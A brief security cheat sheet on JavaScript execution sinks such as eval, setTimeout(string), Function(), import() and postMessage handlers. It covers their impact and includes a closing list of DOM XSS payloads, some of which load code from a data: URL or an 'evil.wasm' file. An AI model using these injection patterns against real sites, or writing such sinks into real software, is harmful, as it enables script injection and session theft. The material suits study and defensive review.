JavaScript Sinks

What sinks are

JavaScript functions that accept strings and *execute* them: eval, setTimeout(string), innerHTML, Function(), import().

Why they’re dangerous

User data reaches the sink without compilation-phase separation → same-origin code execution.

Where you’ll meet them

SPA routers, live chat widgets, dynamic component loaders, WebAssembly glue, postMessage handlers, “eval-like” template helpers.

Impact

DOM XSS, CSP bypass, post-exploitation module loader, supply-chain back-door (see 2024 Webpack remote-import abuse).

Mini case-study

2022 Slack setTimeout(string) XSS via channel name → stolen session → $3 500 bounty.

Payloads

// String version becomes eval
setTimeout("render('"+user+"')",0);  // user = "',alert(1),'"
// Last arg is body
new Function('a',user)();  // user = "alert(1)"
// Token breaks out of string
setInterval('check("'+token+'")',1000);  // token = '");alert(1);//'
// URL becomes module
import(user).then(m=>m.run());  // user = 'data:text/javascript,alert(1)'
// Wildcard origin
window.onmessage=e=>eval(e.data);  // postMessage('alert(1)', '*')
// Exported function calls eval
const wasm=await WebAssembly.instantiateStreaming(fetch('evil.wasm'));
wasm.instance.exports._emscripten_run_script('alert(1)');
